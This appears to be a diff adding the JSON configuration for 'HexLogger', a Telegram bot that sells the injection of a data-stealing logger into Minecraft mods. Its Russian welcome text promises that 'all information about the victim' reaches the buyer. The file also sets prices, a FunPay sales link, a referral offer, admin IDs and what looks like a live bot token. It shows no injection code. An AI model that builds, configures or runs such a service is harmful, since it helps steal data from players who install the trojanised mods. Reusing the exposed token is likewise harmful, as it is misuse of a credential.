@@ -1,0 +1,14 @@
+{
+  "bot_token": "8706188951:AAEt0xU_jp3_vRHKl36p4eJ0fh_q7gNL4JQ",
+  "admin_ids": [8066476451],
+  "channel_url": "https://t.me/HexLogger",
+  "support_url": "https://t.me/doritos_8",
+  "mod_version": "1.21.4",
+  "inject_dir": "D:/logger/fabric-1.21.4",
+  "star_price": 25,
+  "rub_price": 25,
+  "admin_username": "doritos_8",
+  "funpay_url": "https://funpay.com/lots/offer?id=75176946",
+  "reviews_channel": "@HexLogger_rew",
+  "welcome_text": "👋 <b>Добро пожаловать в HexLogger!</b>\n\nЭто бот для инжекта логгера в любой мод.\n\nЧто я умею:\n\n🎮 <b>Вшить логгер в мод</b> — вшиваю логгер в твой мод, вся информация о жертве будет приходить на твой бот\n\n🎁 <b>Бесплатный инжект</b> — пригласи друга и получи инжект бесплатно\n\n🛠 <b>Поддержка</b> — связь с администрацией при проблемах\n\n📢 <b>Канал</b> — новости и обновления\n\nВыбери действие в меню ниже 👇"
+}
